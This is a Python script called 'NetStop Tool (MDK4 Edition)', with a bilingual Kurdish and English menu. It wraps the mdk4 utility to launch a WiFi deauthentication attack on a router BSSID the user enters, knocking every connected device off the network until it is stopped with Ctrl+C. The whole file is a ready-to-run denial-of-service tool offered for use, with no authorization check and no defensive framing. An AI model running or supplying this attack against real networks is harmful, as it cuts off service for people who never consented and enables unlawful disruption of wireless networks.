#!/usr/bin/env python3
import subprocess
import os
import sys
import time

RED = "\033[1;31m"
CYAN = "\033[1;36m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
RESET = "\033[0m"

def clear_screen():
    os.system('clear')

def show_banner():
    clear_screen()
    print(f"{GREEN}" + r" _  _ _  _ ____ ___  _ ____ ___ ____ _  _ " + f"{RESET}")
    print(f"{GREEN}" + r" |_/  |  | |__/ |  \ | [__   |  |__| |\ | " + f"{RESET}")
    print(f"{YELLOW}" + r" | \_ |__| |  \ |__/ | ___]  |  |  | | \| " + f"{RESET}")
    print(f"{CYAN}==============================================={RESET}")
    print(f"{RED}          NetStop Tool (MDK4 Edition)          {RESET}")
    print(f"{CYAN}==============================================={RESET}")
    print(f"{YELLOW} ئامرازی کۆنتڕۆڵ و بڕینی گشتی تۆڕ لە ڕێگەی هەواوە")
    print(f" Wireless Network Deauth & Isolation Tool      {RESET}")
    print(f"{CYAN}==============================================={RESET}")

def start_attack(interface, bssid):
    show_banner()
    print(f"{RED}[+] هێرشی بڕینی هێڵ چالاک کرا لەسەر: {bssid}")
    print(f"[+] Attack started on BSSID: {bssid}{RESET}")
    print(f"{YELLOW}[*] بۆ ڕاگرتنی هێرشەکە، دابگرە (Ctrl + C)")
    print(f"[*] To stop the attack, press (Ctrl + C){RESET}")
    
    command = ["sudo", "mdk4", interface, "d", "-a", bssid]
    try:
        subprocess.run(command)
    except KeyboardInterrupt:
        print(f"\n{GREEN}[+] هێرشەکە ڕاگیرا و هێڵ بۆ ئامێرەکان گەڕایەوە. ✅")
        print(f"[+] Attack stopped. Connection restored! ✅{RESET}")
        time.sleep(2)

def main():
    if os.geteuid() != 0:
        print(f"{RED}[-] تکایە ئامرازەکە وەک بەرپرسیار (sudo) ڕاکەرەوە!")
        print(f"[-] Please run this tool as root (sudo)!{RESET}")
        sys.exit(1)

    while True:
        show_banner()
        print(f"{CYAN}[1]{RESET} ده‌ستپێکردنی هێرشی بڕینی هێڵ 🚫  (Start Attack)")
        print(f"{CYAN}[2]{RESET} چوونەدەرەوە لە ئامرازەکە ❌      (Exit)")
        print()
        
        choice = input(f"{YELLOW}ژمارەیەک هەڵبژێره‌ / Select option (1 or 2): {RESET}").strip()
        
        if choice == '1':
            show_banner()
            interface = input(f"{CYAN}[*] ناوی کارت / Interface (wlan0mon): {RESET}").strip()
            bssid = input(f"{CYAN}[*] ماک ئەدرەس / Router BSSID: {RESET}").strip()
            
            if not interface or not bssid:
                print(f"{RED}[-] تکایە زانیارییەکان بە دروستی پڕبکەرەوە! / Missing fields!{RESET}")
                time.sleep(1.5)
                continue
            start_attack(interface, bssid)
        elif choice == '2':
            print(f"{GREEN}\nسوپاس بۆ بەکارهێنانی ئامرازەکە! خوا حافیز 👋")
            print(f"Thank you for using NetStop! Goodbye 👋{RESET}")
            break
        else:
            print(f"{RED}[-] هەڵبژاردنی نادروست! / Invalid option!{RESET}")
            time.sleep(1)

if __name__ == '__main__':
    main()
